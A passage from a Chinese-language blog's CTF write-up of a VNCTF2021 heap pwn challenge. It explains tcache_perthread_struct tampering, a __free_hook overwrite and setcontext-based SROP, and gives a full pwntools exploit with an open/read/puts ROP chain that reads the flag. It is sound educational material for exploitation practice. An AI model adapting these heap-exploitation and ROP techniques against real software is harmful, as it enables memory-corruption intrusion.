+<img loading=lazy src=/posts/vnctf2021/02.png></p><p>可以看到,其中0x40即为<code>TCACHE_MAX_BINS</code>的默认值.这个值很好理解,<code>0x410 = 0x40*0x10+0x10</code>是<code>tcache</code>中可存放的最大的chunk. 此处为了方便,直接改写<code>TCACHE_MAX_BINS+1</code>的位置,使很大的chunk也能落入<code>tcache</code>当中.</p><ol start=2><li>通过程序提供的堆溢出,将<code>__free_hook</code>写到<code>entries[idx]</code>,并获取<code>__free_hook</code>. 这里需要满足<code>counts[idx]</code>>= 1, 而程序也贴心的准备好了这样一个chunk. (我就喜欢这种题)</li></ol><p><img loading=lazy src=/posts/vnctf2021/03.png></p><p>在计算<code>entries[idx]</code>的偏移时要注意,尽管<code>TCACHE_MAX_BINS</code>被改动,<code>entries</code>的起始偏移却没有变,仍然是<code>0x10+0x80 = 0x90</code>的位置.</p><p>计算偏移的方式如下, 用0x1710大小的chunk举例:</p><pre tabindex=0><code>(0x1710-0x20)/0x10 * 8 + 0x90 = 0xC08
+输入的偏移是基于那个程序一开始分配的chunk
+因此 
+输入偏移 = 0xC08 - 0x2A0 = 0x968
+</code></pre><p>另外,还需要验证<code>counts[0x1710]</code>是否落在布满&rsquo;\x01&rsquo;的chunk上,</p><pre tabindex=0><code>(0x1710-0x20)/0x10 * 2 + 0x10 = 0x2EE
+</code></pre><p>命中!</p><p>因此输入偏移<code>0x968</code>并写入<code>__free_hook</code>,再输入size<code>0x1700</code>,就能获得到<code>__free_hook</code>.</p><ol start=3><li>通过setcontext进行SROP, 同时布置ORW的ROP链, 执行ROP链.</li></ol><p>之前对2.29以上版本的setcontext不熟悉,发现需要控制rdx. 这里要用到一个魔法gadget.</p><pre tabindex=0><code>   0x154b20:	mov    rdx,QWORD PTR [rdi+0x8]
+   0x154b24:	mov    QWORD PTR [rsp],rax
+   0x154b28:	call   QWORD PTR [rdx+0x20]
+</code></pre><p>我们可以通过rdi (此时即__free_hook的地址)控制rdx. 根据gadget,将参数(指向伪栈帧的指针)放在<code>rdi+8</code>的位置, 再把<code>setcontext + 61</code> 放在<code>伪栈帧+0x20</code>的位置.这个布置参考了大佬的文章,利用伪栈帧前面的垃圾空间来为gadget布局,非常巧妙
+<a href=https://www.anquanke.com/post/id/235821#h3-6>https://www.anquanke.com/post/id/235821#h3-6</a></p><p>之后就是布置伪栈帧与ROP链.</p><h3 id=完整exp-1>完整exp<a hidden class=anchor aria-hidden=true href=#完整exp-1>#</a></h3><pre tabindex=0><code>from pwn import *
+import sys
+
+
+if len(sys.argv) &gt;1 and sys.argv[1] == &#39;r&#39;:
+    target = remote(&#34;node3.buuoj.cn&#34;,26222)
+else:
+   # target = process(&#34;&#34;)
+    target=process([&#34;./ld-2.30.so&#34;,&#34;./pwn&#34;],env={&#34;LD_PRELOAD&#34;:&#34;./libc.so.6&#34;})
+    if(len(sys.argv)&gt;1) and sys.argv[1]==&#39;g&#39;:
+        gdb.attach(target)
+
+context.log_level=&#39;debug&#39;
+context.arch=&#39;amd64&#39;
+#context.update(arch=&#39;&#39;)
+#gdb.attach(target)
+
+def writeWhatWhere(where,what):
+    target.recvuntil(&#34;anywhere\n&#34;)
+    target.send(p64(where))
+    target.recvuntil(&#34;what?\n&#34;)
+    target.send(what)
+
+def pwn():
+    libc = ELF(&#34;./libc.so.6&#34;)
+    target.recvuntil(&#34;GIFT: &#34;) 
+    leak = int(target.recvline(),16)
+    success(&#34;leak stdout: &#34; + hex(leak))
+    tcache_max_bin = leak - 0x13d0
+    libc_base = leak-0x1eb6a0
+    free_hook = libc_base + 0x1edb20
+
+    success(&#34;TCACHE_MAX_BINS: &#34;+hex(tcache_max_bin))
+
+    offset = 0x968
+    size = 0x1700 #0x1710
+    
+    writeWhatWhere(tcache_max_bin+1,&#34;\xff&#34;)
+    target.recvuntil(&#34;Offset:\n&#34;)
+    target.sendline(str(offset))
+
+    target.recvuntil(&#34;Content:\n&#34;)
+    target.send(p64(free_hook))
+    
+    target.recvuntil(&#34;ize:\n&#34;)
+    target.sendline(str(size))
+    
+    # payload constructed here
+    
+    ret = libc_base + 0x256b9
+    pop_rdi = libc_base + 0x26bb2
+    pop_rsi = libc_base + 0x2709C
+    pop_rdx_r12 = libc_base + 0x11c3b1
+    
+    the_gadget = libc_base + 0x154b20
+    setcontext = libc_base + libc.sym[&#34;setcontext&#34;]
+    
+    frame = SigreturnFrame()
+    frame_addr = free_hook+0x10
+    
+    frame.rax = 0 
+    frame.rsp = frame_addr + 0x108
+    frame.rip = ret
+
+    ROP_chain = [
+            pop_rdi,
+            frame_addr + 0xF8,
+            libc_base + libc.sym[&#34;open&#34;],
+            pop_rdi,
+            3,
+            pop_rsi,
+            frame_addr+0x250,
+            pop_rdx_r12,
+            0x40,
+            0,
+            libc_base + libc.sym[&#34;read&#34;],
+            pop_rdi,
+            frame_addr+0x250,
+            libc_base + libc.sym[&#34;puts&#34;]
+            ]
+    
+    
+    frame_str = str(frame).ljust(0xf8,&#34;\x00&#34;)
+    payload = p64(the_gadget) + p64(frame_addr) + p64(0)*4 + p64(setcontext+61)
+    payload += frame_str[0x28:] + &#34;./flag\x00\x00&#34;+p64(0) + flat(ROP_chain)
+
+
+    target.recvuntil(&#34;&gt;&gt;&#34;)
+    target.sendline(payload)
+
+    target.interactive()
+
+
+target.interactive()
+</code></pre><h2 id=总结-1>总结<a hidden class=anchor aria-hidden=true href=#总结-1>#</a></h2><p>这两道题都考察了对tcache_perthread_struct的直接攻击,也碰到了未接触过的知识点,好评!
+<del>那道VM题鸽了,实在不想看.</del></p><h3 id=参考>参考<a hidden class=anchor aria-hidden=true href=#参考>#</a></h3><p><a href=https://www.anquanke.com/post/id/235821#>https://www.anquanke.com/post/id/235821</a></p></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/write-up/>Write-Up</a></li><li><a href=http://localhost:1313/tags/heap/>Heap</a></li><li><a href=http://localhost:1313/tags/ctf/>Ctf</a></li><li><a href=http://localhost:1313/tags/pwn/>Pwn</a></li></ul><nav class=paginav><a class=prev href=http://localhost:1313/posts/house-of-botcake/><span class=title>« Prev</span><br><span>House of Botcake</span>
+</a><a class=next href=http://localhost:1313/posts/heap_writeup/><span class=title>Next »</span><br><span>简单堆题write-up</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share VNCTF2021 Pwn on x" href="https://x.com/intent/tweet/?text=VNCTF2021%20Pwn&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fvnctf2021%2f&amp;hashtags=write-up%2cheap%2cctf%2cpwn"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share VNCTF2021 Pwn on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fvnctf2021%2f&amp;title=VNCTF2021%20Pwn&amp;summary=VNCTF2021%20Pwn&amp;source=http%3a%2f%2flocalhost%3a1313%2fposts%2fvnctf2021%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share VNCTF2021 Pwn on reddit" href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fvnctf2021%2f&title=VNCTF2021%20Pwn"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share VNCTF2021 Pwn on facebook" href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2fvnctf2021%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share VNCTF2021 Pwn on whatsapp" href="https://api.whatsapp.com/send?text=VNCTF2021%20Pwn%20-%20http%3a%2f%2flocalhost%3a1313%2fposts%2fvnctf2021%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share VNCTF2021 Pwn on telegram" href="https://telegram.me/share/url?text=VNCTF2021%20Pwn&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fvnctf2021%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share VNCTF2021 Pwn on ycombinator" href="https://news.ycombinator.com/submitlink?t=VNCTF2021%20Pwn&u=http%3a%2f%2flocalhost%3a1313%2fposts%2fvnctf2021%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>N0k's Den</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
